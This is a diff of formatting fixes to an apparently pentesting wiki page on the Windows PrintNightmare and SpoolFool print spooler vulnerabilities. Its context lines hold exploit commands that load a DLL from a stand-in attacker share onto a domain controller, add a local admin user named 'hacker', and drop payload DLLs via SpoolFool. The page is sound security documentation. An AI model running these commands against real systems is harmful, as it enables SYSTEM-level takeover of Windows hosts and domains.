@@ -1,6 +1,5 @@
 # PrintNightmare (Windows Print Spooler RCE/LPE)
 
-
 > PrintNightmare is the collective name given to a family of vulnerabilities in the Windows **Print Spooler** service that allow **arbitrary code execution as SYSTEM** and, when the spooler is reachable over RPC, **remote code execution (RCE) on domain controllers and file servers**. The most-widely exploited CVEs are **CVE-2021-1675** (initially classed as LPE) and **CVE-2021-34527** (full RCE). Subsequent issues such as **CVE-2021-34481 (“Point & Print”)** and **CVE-2022-21999 (“SpoolFool”)** prove that the attack surface is still far from closed.
 
 ---
@@ -31,7 +30,7 @@ python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
        -f \
        '\\attacker_IP\share\evil.dll'
 ```
-```
+
 Popular PoCs include **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) and Benjamin Delpy’s `misc::printnightmare / lsa::addsid` modules in **mimikatz**.
 
 ### 2.2 Local privilege escalation (any supported Windows, 2021-2024)
@@ -42,7 +41,7 @@ The same API can be called **locally** to load a driver from `C:\Windows\System3
 Import-Module .\Invoke-Nightmare.ps1
 Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
 ```
-```
+
 ### 2.3 SpoolFool (CVE-2022-21999) – bypassing 2021 fixes
 
 Microsoft’s 2021 patches blocked remote driver loading but **did not harden directory permissions**. SpoolFool abuses the `SpoolDirectory` parameter to create an arbitrary directory under `C:\Windows\System32\spool\drivers\`, drops a payload DLL, and forces the spooler to load it:
@@ -54,7 +53,7 @@ SpoolFool.exe -dll add_user.dll
 # PowerShell wrapper
 Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
 ```
-```
+
 > The exploit works on fully-patched Windows 7 → Windows 11 and Server 2012R2 → 2022 before February 2022 updates 
 
 ---
@@ -92,8 +91,7 @@ Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
 
 ---
 
-**More reading (external):** Check the 2024 walk-through blog post – [[https://www.hackingarticles.in/understanding-printnightmare-vulnerability/|Understanding PrintNightmare Vulnerability]]
-
+**More reading (external):** Check the 2024 walk-through blog post – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)
 
 ## References
 
